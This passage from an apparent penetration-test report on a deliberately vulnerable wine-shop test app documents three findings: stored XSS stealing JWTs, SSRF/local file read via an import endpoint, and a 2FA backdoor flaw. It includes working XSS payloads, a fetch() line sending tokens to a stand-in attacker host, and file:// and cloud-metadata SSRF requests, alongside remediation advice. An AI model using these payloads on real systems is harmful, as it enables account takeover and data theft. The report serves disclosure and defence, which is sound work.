- The SPA's authentication credential — an HS256 JWT with 7-day expiry — is stored in `localStorage.token` on the same origin. Injected script reads the JWT and exfiltrates it via `fetch()` to an attacker-controlled endpoint without any user interaction beyond opening the poisoned page. This was demonstrated: injected JS successfully read the victim's JWT and placed the token prefix into `document.title` on the exploit browser.

- The stolen JWT grants full account takeover of the visiting user for its remaining lifetime, with no server-side revocation to shorten that window. If an administrator visits a poisoned page — a routine catalog action — the attacker obtains admin credentials and unlocks the entire `/admin/orders*` surface (customer names, addresses, order histories) and any other admin-only endpoints. Combined with the separately reported `/orders/{id}` finding that exposes `owner_password_hash`, `owner_totp_secret`, and `owner_is_admin`, a stolen JWT immediately yields the victim's bcrypt hash and TOTP secret.

- The delivery vector is a first-party catalog page linked from the site's home page and product lists — no phishing, no cross-site delivery, no unusual user interaction. Every existing session cookie/token in the SPA origin is at risk on every page view of a poisoned wine.

- One poisoned review persists until an administrator manually deletes it. No moderation UI or review-flagging surface was observed in the API, meaning removal requires direct database intervention.

Business impact: PII exposure (all customer orders and shipping addresses via admin JWT theft), credential theft, full account takeover of any registered user (including administrators), and reputational damage. Absent CSP, HttpOnly cookies, and rate limits on registration/review posting, the entire site is one HTTP request away from a mass-takeover event.

#### Technical Analysis

Two independent flaws combine to make this a fully weaponisable persistent XSS:

1. Server-side (API host `api.taintedport.com`): the review-creation handler accepts the `comment` JSON field verbatim and stores it in the database without any HTML encoding, tag-stripping, or allow-list sanitisation. A round trip through `POST /wines/{id}/reviews` followed by `GET /wines/{id}/reviews` returns the same bytes that were sent — including `<`, `>`, quotes, and event-handler attributes. The only observed control is a "one review per user per wine" business rule, which is trivially bypassed by registering a new account for each poisoned page (open self-registration, no email verification).

2. Client-side (SPA host `taintedport.com`): the Next.js/React SPA that renders `/wines/{id}` fetches review objects from the API and inserts the `comment` string into the DOM as raw HTML (consistent with a `dangerouslySetInnerHTML` sink, since text values in React are otherwise auto-escaped by default). Direct DOM inspection after page load shows the payload becomes live elements inside `<div class="text-zinc-300 text-sm leading-relaxed mt-2">` (the review-body container). Injected `<img src=x onerror=...>` handlers execute during image-error dispatch; injected `<script>` tags introduced via innerHTML do not execute (browser standard behaviour), but inline event handlers (`onerror`, `onload`, `onmouseover`, etc.) are more than sufficient — and were demonstrated.

3. Missing defence-in-depth: the response to `/wines/{id}` carries no `Content-Security-Policy` header (verified in headers), no `X-Content-Type-Options: nosniff`, no `X-Frame-Options`, and no Trusted Types opt-in. The JWT is placed in `localStorage.token` — same-origin JavaScript can read it unconditionally (no HttpOnly cookie protection). There is no server-side JWT revocation, so a stolen token remains valid for its full 7-day lifetime.

The end-to-end chain is:
  attacker registers → POST review with HTML payload in comment → any visitor loads wine page →
  browser parses the review DOM insert → onerror fires → localStorage.token is read →
  fetch('https://attacker/?t='+token) exfiltrates the JWT → attacker uses the JWT to impersonate.

Root cause: user-controlled string flowed into an HTML sink on the render path without contextual output encoding. The correct fix is a single-character source change (`{review.comment}` instead of `dangerouslySetInnerHTML={{__html: review.comment}}`), backed by server-side sanitisation for defence in depth.


#### Proof of Concept


Prerequisites: none beyond ability to reach `api.taintedport.com` and `taintedport.com` over the internet. No prior credentials required.

1. Register a throwaway attacker account (self-registration is open):

    POST https://api.taintedport.com/auth/register
    Content-Type: application/json
    { "name": "AttackerPOC", "email": "attacker-<rand>@example.com", "password": "Pass1234!" }
    → 201 { "success": true, "token": "<attacker JWT>", "user": {...} }

2. Submit a poisoned review — the `comment` field carries an HTML payload with an inline event handler that reads `localStorage.token` and mutates `document.title` (in a real attack the same payload would `fetch()` the token to an attacker-controlled endpoint):

    POST https://api.taintedport.com/wines/17/reviews
    Authorization: Bearer <attacker JWT>
    Content-Type: application/json
    { "rating": 5,
      "comment": "<img src=x onerror=\"window.__xss_fired=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">POC-MARKER" }
    → 201 { "success": true, "message": "Review submitted successfully.", "review_id": 130 }

3. Confirm verbatim storage:

    GET https://api.taintedport.com/wines/17/reviews
    → reviews[0].comment == "<img src=x onerror=\"...localStorage.getItem('token')...\">POC-MARKER"
       (byte-for-byte identical to what was sent)

4. Trigger execution as the victim: any authenticated user (JWT already present in `localStorage.token`) opens `https://taintedport.com/wines/17`. The SPA fetches the reviews, inserts `review.comment` into the DOM as raw HTML, the browser dispatches the `<img>` element's error event because `src=x` is not a valid URL, `onerror` runs on the `taintedport.com` origin, reads `localStorage.token`, and (in the demo) writes it to `document.title`. A real payload would `fetch()` the token to an attacker-controlled endpoint.

Observed on the exploit browser during validation:
- `window.__xss_fired === 1`
- `document.title == "V17XSS_JWT:<victim JWT first 40 chars>"` — first 40 characters match the victim's real JWT byte-for-byte.
- The `<img>` element is a live DOM node inside the review-body `<div>`.
- No CSP is set; no HttpOnly cookie shields the JWT; nothing in the response mitigates execution.

The provided `poc/poc.py` script automates all of the above with a visible browser and saves a screenshot to `evidence/`. The provided `poc/verify.py` returns exit code 0 (`[VULNERABLE]`) as long as the server continues to store the payload verbatim, and — if playwright is available — additionally confirms the client-side execution end-to-end.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Attacker registers a throwaway account (open self-registration, no verification)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"V17","email":"validator17-xss-21944@example.com","password":"Pass1234!"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<attacker JWT>","user":{"id":466,"name":"V17","email":"validator17-xss-21944@example.com","is_admin":false}}
```


> Open registration returns a fully valid JWT immediately. No email verification, no CAPTCHA, no rate limit — this is the credential used to submit poisoned reviews.



**2. Attacker POSTs a review whose 'comment' field carries an HTML payload with an inline event handler that reads localStorage.token**

*Request:*
```http
POST /wines/17/reviews HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <attacker JWT>
Content-Type: application/json

{"rating":5,"comment":"<img src=x onerror=\"window.__v17_ok=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">V17-PROBE-B"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"Review submitted successfully.","review_id":130}
```


> Server accepts the payload with no sanitisation, no tag stripping, no HTML encoding — the exact bytes are stored.



**3. Confirmation: the API returns the poisoned comment byte-for-byte on the next GET**

*Request:*
```http
GET /wines/17/reviews HTTP/1.1
Host: api.taintedport.com
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"reviews":[{"id":130,"rating":5,"comment":"<img src=x onerror=\"window.__v17_ok=1;document.title='V17XSS_JWT:'+(localStorage.getItem('token')||'NULL').slice(0,40)\">V17-PROBE-B","created_at":"2026-07-20 11:52:50","user_name":"V17"} , ...]}
```


> review.comment is returned verbatim. Note that user_name is returned unchanged too — but the SPA HTML-encodes user_name at render time, so only comment is a live XSS sink.



**4. Victim's browser executes the payload upon opening the wine page — leaks JWT**

*Request:*
```http
GET /wines/17 HTTP/1.1
Host: taintedport.com
(browser navigation; SPA then calls GET https://api.taintedport.com/wines/17/reviews and inserts review.comment into the DOM as raw HTML)
```

*Response:*
```http
(rendered DOM contains a live <img src="x" onerror="...localStorage.getItem('token')..."> inside <div class="text-zinc-300 text-sm leading-relaxed mt-2">; browser dispatches error → onerror runs → document.title becomes 'V17XSS_JWT:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ' where the token prefix matches the victim's JWT byte-for-byte)
```


> Directly observed in a Chromium browser during validation: window.__v17_ok === 1 and document.title contains the leaked JWT prefix. No CSP header is served on this response, and the JWT is stored in localStorage (not HttpOnly), so injected same-origin JS reads it unconditionally. A real payload would fetch() the token to an attacker-controlled endpoint.





#### Remediation

1. Escape output in the SPA (primary fix). In the React component that renders a review card, render `review.comment` as text — `{review.comment}` — instead of via `dangerouslySetInnerHTML` (or equivalent raw-HTML API). React auto-escapes text expressions and this alone neutralises the vulnerability. If markdown or basic rich text is a genuine requirement, run the value through a strict HTML sanitiser (DOMPurify with an allow-list of `<p>`, `<em>`, `<strong>`, `<br>` and no attributes) before rendering.

2. Sanitise/validate on input in the API (defence in depth). In the PHP handler for `POST /wines/{id}/reviews`, reject or strip HTML from the `comment` field on save. Either enforce plain-text-only (server-side `strip_tags` or reject on regex match) or run the same DOMPurify-equivalent server-side sanitiser used by the client, so the stored value cannot contain event handlers or `<script>` tags.

3. Deploy a strict Content-Security-Policy on `taintedport.com`:
   `default-src 'self'; script-src 'self' 'nonce-<per-request>'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; connect-src 'self' https://api.taintedport.com; require-trusted-types-for 'script'`
   This alone would prevent execution of the injected inline handlers and block exfiltration to an arbitrary domain.

4. Move the JWT out of `localStorage` into an `HttpOnly; Secure; SameSite=Strict` cookie. Same-origin JavaScript would no longer be able to read the credential even if an XSS is missed in future.

5. Add server-side revocation to JWT sessions. Maintain a per-user session/version claim (or a token-id blocklist) that lets an administrator invalidate all issued tokens for a compromised account within seconds instead of waiting up to 7 days for expiry.

6. Anti-abuse controls on registration and review posting: email verification on `POST /auth/register`, per-IP and per-account rate limits on `POST /wines/{id}/reviews`, CAPTCHA on both endpoints, and optionally require an order-history check before a review is accepted.

7. Moderation and auditing surface: add an admin endpoint to list, flag, and delete reviews so that once a payload is found it can be removed without direct DB access. Log the raw bytes of every `comment` submission with the associated `user_id` and IP for retrospective review.

8. Set hardening headers on all responses from `taintedport.com`: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP).

---


### vuln-0021: SSRF and Arbitrary Local File Read via POST /wines/import-url ("url" body parameter)










**Severity:** HIGH | **CVSS:** 8.5 | **Endpoint:** `/wines/import-url` | **Method:** POST | **CWE:** CWE-918 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`

#### Description

The endpoint `POST /wines/import-url` on `api.taintedport.com` accepts a user-supplied URL in the JSON body and performs a server-side fetch of that URL, returning the raw response body inside the JSON reply as the `raw_content` field. The URL is not validated: no scheme allow-list, no host/IP allow-list, no redirect controls, and no output filtering. As a result, any authenticated user (including a self-registered non-admin account) can:

1. Read arbitrary local files readable by the API process by supplying `file://` URLs (Local File Inclusion via PHP's `file://` stream wrapper).
2. Reach the AWS EC2 Instance Metadata Service via `http://169.254.169.254/…` (Server-Side Request Forgery to the cloud-metadata surface, IMDSv1).
3. Reach loopback and internal RFC1918 hosts on the API server's network, exfiltrating full HTTP response bodies back to the attacker in the same request.

Only URL schemes not supported by PHP's default stream wrappers (`gopher://`, `dict://`, `ftp://`) fail; every other tested primitive succeeds. The Bearer-token requirement is not a mitigation because user registration is open with no email verification, so any anonymous internet attacker can obtain a valid JWT in one HTTP request.


#### Attack Flow

```
SSRF + LFI via POST /wines/import-url
                       ─────────────────────────────────────

  ┌──────────────┐                                ┌────────────────────────────┐
  │              │  (1) POST /auth/register       │  api.taintedport.com       │
  │  Attacker    │─────────────────────────────▶  │  (PHP API)                 │
  │  (internet)  │  {email,password}              │                            │
  │              │ ◀───────────────────────────── │  201 + JWT (non-admin)     │
  └──────┬───────┘        JWT                     └──────────────┬─────────────┘
         │                                                       │
         │  (2) POST /wines/import-url                            │
         │      Authorization: Bearer <jwt>                       │
         │      {"url":"file:///etc/hostname"}                    │
         ├─────────────────────────────────────────────────────▶  │
         │                                            file://─────┤
         │                                              wrapper   │
         │                                                        ▼
         │                                              ┌────────────────────┐
         │                                              │ Local filesystem   │
         │                                              │   /etc/hostname    │
         │                                              │   /var/www/...     │
         │                                              │   .env / secrets   │
         │                                              └─────────┬──────────┘
         │  ◀───────────────────────────────────────────────────  │
         │     200 { raw_content: "4148066827d9\n" }              │
         │                                                        │
         │  (3) POST /wines/import-url                            │
         │      {"url":"http://169.254.169.254/latest/meta-data/"}│
         ├─────────────────────────────────────────────────────▶  │
         │                                             http://────┤
         │                                                        │
         │                             ┌──────────────────────────▼──────┐
         │                             │ AWS EC2 IMDSv1                  │
         │                             │ 169.254.169.254                 │
         │                             │  → ami-id, instance-id,         │
         │                             │    identity-credentials/,       │
         │                             │    iam/, network/, ...          │
         │                             └──────────────────────────┬──────┘
         │  ◀──────────────────────────────────────────────────── │
         │     200 { raw_content: "<full metadata listing>" }     │
         │                                                        │
         │  (4) {"url":"http://127.0.0.1/"}                       │
         ├─────────────────────────────────────────────────────▶  │
         │                                                        │
         │                                 ┌──────────────────────▼──────┐
         │                                 │ 127.0.0.1:80                │
         │                                 │ Internal Next.js frontend   │
         │                                 │ (RFC1918 hosts equally      │
         │                                 │  reachable and exfiltrated) │
         │                                 └──────────────────────┬──────┘
         │  ◀──────────────────────────────────────────────────── │
         │     200 { raw_content: "<!DOCTYPE html>...TaintedPort" }
         │                                                        │
         ▼                                                        ▼

  Root cause: attacker-controlled URL → broad server-side fetch → full body echoed back
  ───────────────────────────────────────────────────────────────────────────────────
     [X] no scheme allow-list  (file://, http:// to internal, all accepted)
     [X] no host/IP filter     (link-local + loopback + RFC1918 reachable)
     [X] no response redaction (raw_content returned verbatim)
     [X] IMDSv1 still enabled on the EC2 instance (no PUT-token requirement)

  Prerequisites for the attacker:
     - Reachability of api.taintedport.com (public)
     - Any account — obtainable via open /auth/register OR via public demo creds
       disclosed by /openapi.yaml (joe@example.com / password123)
```


#### Impact

A single authenticated request lets an attacker:

- Read arbitrary local files readable by the API service user via `file://` URIs — this includes application source code, configuration files, `.env` files, private keys, session files, and any other secret material on the host filesystem. During validation `/etc/hostname` was retrieved as a benign proof; every file the PHP process can `open()` is equally reachable.
- Enumerate and query the AWS EC2 instance metadata service via IMDSv1. The full `/latest/meta-data/` listing was returned, including entries such as `identity-credentials/`, `iam/` scaffolding, `network/`, `placement/`, and the specific instance-id `i-001f7592c2feb4724`. If an IAM role is ever attached to this instance (or an equivalent SSRF exists on a sibling instance that has one), the same primitive yields temporary AWS credentials in a single request.
- Reach any host on the API server's local network — 127.0.0.1 and any RFC1918 destination — bypassing whatever perimeter firewalling protects those hosts from the internet. Since the fetched body is echoed into `raw_content`, responses from internal services are exfiltrated to the attacker as well. This turns unauthenticated internal admin pages, PHP-FPM status, orchestrator sidecars, in-cluster APIs, etc. into directly-readable resources.
- Perform internal port scanning by observing response bodies and error message differences.

Business impact: full confidentiality break of anything the API process can reach on the local filesystem or on the internal network, plus cloud-metadata reconnaissance that materially reduces the cost of any future privilege-escalation into the AWS tenancy. Because the JWT can be obtained by simply registering, the effective privileges required to reach this primitive from the open internet is negligible.

#### Technical Analysis

The endpoint is a URL fetcher. When called with `{"url": "..."}` it:

1. Passes the string directly to a PHP HTTP client (behaviour matches `file_get_contents($url)` with PHP's default stream wrappers registered).
2. Attempts to `json_decode` the body. If it parses, the endpoint returns `{"success":true, "imported":{…}}`. If not, it returns `{"success":true, "message":"Content fetched but is not valid JSON wine data.", "raw_content":"<verbatim body>"}`.
3. There is **no** scheme validation: `file://` is honoured (PHP file wrapper), and `http://` is honoured regardless of destination IP.
4. There is **no** host/IP filtering: link-local (169.254.169.254), loopback (127.0.0.1), and RFC1918 addresses all resolve and are contacted.
5. There is **no** output filtering: the full fetched body is returned to the attacker verbatim, which converts what could have been a blind SSRF into a full-response exfiltration primitive.
6. Only schemes not supported by PHP's default stream wrappers (`gopher://`, `dict://`, `ftp://`) fail with `400 Failed to fetch content` — filtering is entirely delegated to what PHP's core wrappers do or do not support.

Authentication requirement: the endpoint enforces JWT auth (returns `401 {"success":false,"message":"Access denied. No token provided."}` without a Bearer token). However, `POST /auth/register` is open with no email verification, no CAPTCHA, and no admin approval — an anonymous internet caller obtains a valid JWT with a single request, so authentication is not a barrier in practice.

Root cause: attacker-controlled URL is passed to a broad HTTP/stream client with no scheme allow-list, no host allow-list, no response redaction, and no egress firewalling on the API host. Any of the four mitigations (allow-list host, allow-list scheme, redact response, deny egress to link-local/RFC1918) would materially reduce impact; all four are absent.


#### Proof of Concept


Prerequisites: any valid JWT for the API. Obtainable by (a) `POST /auth/register` (open self-registration, HTTP 201 returns a JWT) or (b) `POST /auth/login` with the demo credentials publicly disclosed in `/openapi.yaml` (joe@example.com/password123, jane@example.com/password123).

Independent reproduction steps (all rules-of-engagement-safe):

1. Register a fresh non-admin account:
   `POST /auth/register` with `{"email":"validator27+ssrf@test.local","password":"Testing123!","name":"Val27"}` → HTTP 201 with a JWT and `user.is_admin: false`.

2. Local File Read via file:// wrapper:
   `POST /wines/import-url` with `Authorization: Bearer <jwt>` and body `{"url":"file:///etc/hostname"}` → HTTP 200 with `raw_content: "4148066827d9\n"`. Any file readable by the API process user is exposed by this primitive.

3. SSRF to AWS IMDSv1 — metadata listing:
   `POST /wines/import-url` with body `{"url":"http://169.254.169.254/latest/meta-data/"}` → HTTP 200 with `raw_content` containing the full IMDS top-level listing (ami-id, block-device-mapping/, identity-credentials/, instance-id, network/, placement/, public-keys/, security-groups, services/, etc.).

4. SSRF to AWS IMDSv1 — instance-id extraction:
   `POST /wines/import-url` with body `{"url":"http://169.254.169.254/latest/meta-data/instance-id"}` → HTTP 200 with `raw_content: "i-001f7592c2feb4724"`.

5. SSRF to loopback with body exfiltration:
   `POST /wines/import-url` with body `{"url":"http://127.0.0.1/"}` → HTTP 200 with `raw_content` containing the internal Next.js frontend HTML (`<!DOCTYPE html>…<title>TaintedPort - Portuguese Wine Store (Security Test App)</title>…`). Proves both internal-network reachability and response exfiltration.

Automated reproduction: `poc.py` runs all four probes end-to-end. Regression test: `verify.py` exits 0 while the endpoint remains vulnerable, exit 1 once mitigations land.

No sensitive files, no IAM credential endpoints, no SSH keys, no environment files, and no non-owned accounts were accessed during validation. Only benign proof targets were retrieved.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Attacker self-registers a non-admin account (no email verification)**

*Request:*
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"email":"validator27+ssrf@test.local","password":"Testing123!","name":"Val27"}
```

*Response:*
```http
HTTP/1.1 201 Created
Content-Type: application/json

{"success":true,"message":"User registered successfully","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....","user":{"id":504,"name":"Val27","email":"validator27+ssrf@test.local","is_admin":false}}
```


> Any anonymous internet user can obtain a valid JWT by self-registering. Combined with the SSRF/LFI below, the effective privileges-required is near zero.



**2. LFI via file:// scheme - server reads /etc/hostname**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"file:///etc/hostname"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"message":"Content fetched but is not valid JSON wine data.","raw_content":"4148066827d9\n","url":"file:\/\/\/etc\/hostname"}
```


> The endpoint accepted the file:// scheme and returned the file body verbatim in raw_content. Any file readable by the PHP-FPM/Apache user is exposed - application source, config, env files, secrets, session data.



**3. SSRF to AWS EC2 IMDSv1 - metadata listing**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"ami-id\nami-launch-index\nami-manifest-path\nblock-device-mapping/\nevents/\nhostname\nidentity-credentials/\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nmetrics/\nnetwork/\nplacement/\nprofile\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups\nservices/\nsystem","url":"http:\/\/169.254.169.254\/latest\/meta-data\/"}
```


> The metadata service replied with the standard IMDSv1 top-level listing. The presence of identity-credentials/ and profile entries shows the metadata endpoint is unrestricted; only the IAM role attachment state limits credential extraction.



**4. SSRF to AWS EC2 IMDSv1 - instance-id exfiltrated**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://169.254.169.254/latest/meta-data/instance-id"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"i-001f7592c2feb4724","url":"http:\/\/169.254.169.254\/latest\/meta-data\/instance-id"}
```


> Cloud-tenancy-scoped identifier exfiltrated in a single request. Any other IMDS path (iam/security-credentials/*, user-data, hostname, etc.) is reachable with the same primitive.



**5. SSRF to loopback - internal Next.js frontend on 127.0.0.1:80**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <jwt>
Content-Type: application/json

{"url":"http://127.0.0.1/"}
```

*Response:*
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"raw_content":"<!DOCTYPE html><html lang=\"en\">...<title>TaintedPort - Portuguese Wine Store (Security Test App)</title>...","url":"http:\/\/127.0.0.1\/"}
```


> Full HTML body of the internal service is echoed to the attacker. This proves both loopback reachability AND response exfiltration, so internal admin panels / status pages / unauthenticated internal APIs are directly accessible and their contents leaked.



**6. Auth check - unauthenticated request returns 401**

*Request:*
```http
POST /wines/import-url HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"url":"file:///etc/hostname"}
```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```


> Authentication is enforced, so PR=L. However, self-registration is open (step 1), making the practical exploitation barrier trivial.





#### Remediation

1. Remove or hard-restrict the URL fetcher. If a URL-based wine import is required, constrain it to an allow-list of external hostnames known to publish legitimate wine data; reject every other host with HTTP 400.
2. Enforce a scheme allow-list of only `https://`. Explicitly reject `file://`, `http://` (internal only), `gopher://`, `dict://`, `ftp://`, `php://`, `data://`, `phar://`, `zip://`, `expect://`, and any custom PHP stream wrapper.
3. Resolve the target hostname before connecting and reject the request if the resolved address falls in any of: `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `169.254.0.0/16` (link-local — blocks AWS/GCP/Alibaba/Azure metadata), `0.0.0.0/8`, `::1/128`, `fe80::/10`, `fc00::/7`. Re-check the resolved address on every HTTP redirect, or disable redirects entirely. Guard against DNS rebinding by resolving once and connecting by IP literal, or by resolving twice and comparing.
4. Do not echo the raw fetched body back in the JSON envelope. Parse the response against the expected wine schema and return only whitelisted structured fields. This alone downgrades a full-response SSRF to a blind SSRF and eliminates the LFI read primitive.
5. Migrate the EC2 instance to IMDSv2 with `HttpTokens=required` and `HttpPutResponseHopLimit=1`. This blocks server-side attackers that cannot send `PUT` requests to the metadata service.
6. Add a Content-Length ceiling and a fetch timeout on the outbound request to prevent DoS via slowloris or gigantic responses.
7. Add an egress firewall on the API host that denies outbound traffic to `169.254.169.254` and to loopback/RFC1918 destinations for the PHP process user.
8. Close open user registration OR ensure user registration cannot bypass a rate-limit and email-verification step — while not the root cause, open self-registration reduces the effective PR of this and similar authenticated primitives to near zero.
9. Rotate any secrets that were reachable through the file:// primitive or IMDS calls during the exposure window (database credentials, JWT signing key, API keys, TLS keys).

---


### vuln-0013: 2FA Enrollment Accepts Client-Supplied `totp_secret` on POST /auth/2fa/enable — Persistent Account Backdoor










**Severity:** HIGH | **CVSS:** 8.3 | **Endpoint:** `/auth/2fa/enable` | **Method:** POST | **CWE:** CWE-287 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`

#### Description

The `POST /auth/2fa/enable` endpoint accepts a shared TOTP secret directly from the request body (`totp_secret`) and treats it as authoritative. The endpoint verifies the accompanying `totp_code` against the client-supplied secret — a check that trivially succeeds because the client generated both values — and then persists the client-chosen secret as the account's canonical `totp_secret`, setting `totp_enabled=true`.

`POST /auth/2fa/setup` (the endpoint that should be the sole authority on the shared secret) does not need to be called at all. Enrollment proceeds against a wholly attacker-provided secret. This violates the fundamental TOTP invariant that the shared secret must originate on the server and never be nominated by the client.

The vulnerable design also fails to require the user's current password at enable time (contrast `/auth/2fa/disable`, `/auth/password`, `/auth/email`, all of which do), so a passive session-theft is sufficient to backdoor MFA on the target account.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ROOT CAUSE:  POST /auth/2fa/enable reads the SHARED TOTP SECRET from a  │
│               client-supplied request-body field (`totp_secret`) and     │
│               persists it as the account's canonical secret.             │
│               No server-side "pending secret" is consulted.              │
│               Current password is NOT re-verified.                       │
└──────────────────────────────────────────────────────────────────────────┘

PREREQUISITE:  Attacker holds a valid JWT for the target account
               (via credential compromise, XSS, MITM, phishing, or the
                sibling JWT-signature-not-verified finding — which
                escalates this to fully unauthenticated).

    Attacker                                              api.taintedport.com
    ────────                                              ───────────────────

  ┌─────────────────────────┐
  │ 1. Generate attacker-   │
  │    chosen base32 secret │
  │    S = ATTACKER_SECRET  │
  │    (16 random bytes,    │
  │     base32-encoded)     │
  └───────────┬─────────────┘
              │
  ┌───────────▼─────────────┐
  │ 2. Compute TOTP code C  │
  │    = HOTP(S, now/30)    │
  │    (RFC 6238, SHA-1)    │
  └───────────┬─────────────┘
              │
              │  POST /auth/2fa/enable
              │  Authorization: Bearer <victim JWT>
              │  {"totp_secret": S,          ◀── attacker-chosen
              │   "totp_code":  C}
              ├──────────────────────────────────────▶  ┌──────────────────────┐
              │                                         │ Server verifies      │
              │                                         │ HOTP(S, now/30) == C │
              │                                         │  (TRUE — client made │
              │                                         │   both S and C)      │
              │                                         │                      │
              │                                         │ UPDATE users SET     │
              │                                         │  totp_secret = S,    │
              │                                         │  totp_enabled = 1    │
              │                                         │  WHERE id = victim   │
              │                                         └──────────┬───────────┘
              │                                                    │
              │  HTTP 200                                          │
              │  {"success":true,                                  │
              │   "message":"Two-factor auth enabled."}            │
              │◀───────────────────────────────────────────────────┘
              │
  ┌───────────▼─────────────┐        ┌──────────────────────────────────────────┐
  │ 3. Victim's account is  │        │  Meanwhile the victim:                   │
  │    now BACKDOORED:      │        │   • has no authenticator entry for S    │
  │    every login needs a  │        │   • sees `requires_2fa: true` on login  │
  │    TOTP code the        │        │   • has NO recovery flow (no backup     │
  │    attacker exclusively │        │     codes, no email challenge)          │
  │    controls.            │        │   • cannot rotate the secret without    │
  │                         │        │     first calling /auth/2fa/disable —   │
  │                         │        │     which requires successful 2FA'd     │
  │                         │        │     access first.                       │
  └───────────┬─────────────┘        └──────────────────────────────────────────┘
              │
              │  Whenever attacker wants access:
              │
              │  POST /auth/login
              │  {"email": victim,
              │   "password": victim-pw,
              │   "totp_code": HOTP(S, now/30)}
              ├──────────────────────────────────────▶  ┌──────────────────────┐
              │                                         │ Password OK          │
              │  HTTP 200                               │ HOTP(S, now/30) OK   │
              │  {"success":true,                       │ Issue session JWT    │
              │   "token": "<new session>"}             └──────────────────────┘
              │◀──── PERSISTENT ACCESS ─────────────────
              │
  ┌───────────▼──────────────────────────────────────────────────────────────┐
  │  PERSISTENCE PROPERTIES                                                  │
  │   • Victim password reset → attacker still authenticates (S unchanged). │
  │   • Victim email change    → attacker still authenticates.              │
  │   • Attacker JWT expires   → attacker relogs with victim's password + C.│
  │     (If attacker also stole/rotated the password separately, they can  │
  │      re-establish full access indefinitely.)                            │
  │   • Only revocation: operator-side MFA reset. No user self-service.    │
  └──────────────────────────────────────────────────────────────────────────┘
```


#### Impact

Persistent account takeover that survives password reset.

An attacker who briefly holds a valid session token for a victim account — whether that token was stolen (XSS on localStorage, MITM, mobile-app leakage), phished, or forged via an unrelated authentication bug — can call `POST /auth/2fa/enable` with a TOTP secret only they know. From that moment on:

- Every subsequent login for the victim requires a TOTP code the attacker exclusively controls; the victim's authenticator app has no matching entry.
- Password rotation does NOT clear the attacker's TOTP secret. The victim cannot recover the account by resetting their password.
- No self-service recovery flow was observed on this API (no backup codes endpoint, no email challenge, no MFA-reset support). Recovery requires operator intervention.
- The attacker can also `POST /auth/2fa/disable` on the victim's behalf during the initial takeover to erase evidence, or leave the backdoor in place to lock the victim out and preserve durable access for themselves.

Confidentiality (H): all of the victim's private data (profile, orders, saved payment metadata) remains reachable by the attacker across arbitrary password changes.
Integrity (H): the attacker permanently modifies the victim's MFA state and can subsequently authenticate as the victim at will.
Availability (L): the victim can be locked out of their own account.

#### Technical Analysis

Expected TOTP enrollment flow:
1. `POST /auth/2fa/setup` — server generates a random base32 secret, stores it as a pending value keyed to the calling `user_id`, and returns it plus an otpauth URI to the client.
2. `POST /auth/2fa/enable {totp_code}` — server looks up the pending secret for the calling user, verifies the submitted code against it, promotes the pending secret to the enabled column, and sets `totp_enabled = true`.

Observed flow:
1. `POST /auth/2fa/enable {totp_secret, totp_code}` — the server reads both the secret AND the code out of the request body, HMAC-verifies the code against the client-supplied secret, and on success stores the client's secret as the account's `totp_secret`. There is no cross-reference to any server-side pending secret; the pending secret (if any exists) is silently overwritten.

Two orthogonal server-side defects:
- The client is trusted to nominate the shared secret in a request body field.
- The server does not consult any server-side "pending TOTP secret" state for the calling user during enable.

Because the endpoint is only gated by the session bearer token (no current-password re-confirmation), any principal holding a valid JWT for the target account can rewrite the account's TOTP secret. The stored secret is not cleared by password change, email change, or profile update; the only legitimate reset is `POST /auth/2fa/disable {password}` — which the attacker can also perform during their window of access.


#### Proof of Concept


Preconditions: the attacker holds a valid JWT for the target account. In this validation the JWT was obtained by simply logging in with credentials belonging to a fresh account we controlled (i.e. simulating a stolen token) — no /auth/2fa/setup call was needed. In a real attack the JWT could be stolen or forged.

Independent reproduction (from scratch, not copied from the tester):

1. Register a fresh victim account via `POST /auth/register` and capture the returned JWT.
